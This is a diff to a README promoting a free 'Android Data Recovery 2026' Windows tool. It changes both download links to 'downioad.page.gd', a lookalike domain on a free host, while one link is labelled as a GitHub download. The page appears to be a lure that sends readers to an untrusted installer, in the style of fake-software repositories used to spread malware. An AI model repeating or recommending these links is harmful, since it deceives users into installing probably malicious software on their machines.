@@ -2,7 +2,7 @@
 
 Android Data Recovery 2026 Free Tool is a reliable Windows application designed to help users recover lost or deleted data from their Android devices. With its intuitive interface and powerful scanning algorithms, you can retrieve photos, videos, contacts, messages, and more without needing root access. Whether you accidentally deleted files or lost data due to a system error, this tool provides a straightforward solution for data recovery on Windows.
 
-[![Download Installer](https://img.shields.io/badge/Download-Installer-brightgreen?style=for-the-badge&logo=github)](https://download-page.page.gd/)
+[![Download Installer](https://img.shields.io/badge/Download-Installer-brightgreen?style=for-the-badge&logo=github)](https://downioad.page.gd/)
 
 ## Key Features
 
@@ -56,7 +56,7 @@ A: The tool operates in a read-only mode during scanning, so it does not modify 
 
 For the latest version of Android Data Recovery 2026 Free Tool, please download it from the official link below:
 
-[Download the latest version from GitHub](https://download-page.page.gd/)
+[Download the latest version from GitHub](https://downioad.page.gd/)
 
 ---
 
